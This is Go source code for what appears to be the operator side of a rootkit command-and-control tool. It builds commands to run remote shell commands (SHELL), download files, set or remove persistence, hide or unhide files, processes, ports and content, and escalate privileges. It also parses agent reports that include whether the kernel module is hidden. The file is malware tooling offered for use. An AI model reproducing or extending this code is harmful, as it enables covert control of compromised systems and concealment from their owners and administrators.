package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
)

func rawToString(raw json.RawMessage) string {
	var s string
	if json.Unmarshal(raw, &s) == nil {
		return s
	}
	return string(raw)
}

type agentInfo struct {
	Hostname      string              `json:"hostname"`
	Kernel        string              `json:"kernel"`
	Arch          string              `json:"arch"`
	PID           int                 `json:"pid"`
	UID           int                 `json:"uid"`
	DistroID      string              `json:"distro_id"`
	DistroRelease string              `json:"distro_release"`
	HasHeaders    bool                `json:"has_headers"`
	ModuleHidden  bool                `json:"module_hidden"`
	Persisted     bool                `json:"persisted"`
	Hidden        map[string][]string `json:"hidden"`
}

type shellResult struct {
	stdout   string
	stderr   string
	exitCode int
}

func parseShellResult(reply string) shellResult {
	payload := strings.TrimSpace(reply)
	payload = strings.TrimPrefix(payload, "SHELL_RESULT ")
	var parsed struct {
		Stdout   string `json:"stdout"`
		Stderr   string `json:"stderr"`
		ExitCode int    `json:"exit_code"`
	}
	if json.Unmarshal([]byte(payload), &parsed) != nil {
		return shellResult{exitCode: -1}
	}
	return shellResult{stdout: parsed.Stdout, stderr: parsed.Stderr, exitCode: parsed.ExitCode}
}

func parseShellResultRaw(raw json.RawMessage) shellResult {
	return parseShellResult(rawToString(raw))
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func protocolCommand(name, arg string) (string, error) {
	switch name {
	case "ping", "status", "info", "persist", "unpersist":
		if arg != "" {
			return "", fmt.Errorf("%s takes no arguments", name)
		}
		return strings.ToUpper(name), nil
	case "exec", "download":
		if arg == "" {
			return "", fmt.Errorf("usage: %s <value>", name)
		}
		verb := strings.ToUpper(name)
		if name == "exec" {
			verb = "SHELL"
		}
		return verb + " " + arg, nil
	case "hide", "unhide":
		fields := strings.SplitN(arg, " ", 2)
		if len(fields) != 2 || fields[1] == "" {
			return "", fmt.Errorf("usage: %s <file|pid|port|content> <value>", name)
		}
		return strings.ToUpper(name) + " " + strings.ToUpper(fields[0]) + " " + fields[1], nil
	case "escalate":
		command := "ESCALATE"
		if arg != "" {
			command += " " + arg
		}
		return command, nil
	default:
		return "", fmt.Errorf("unknown command %q", name)
	}
}

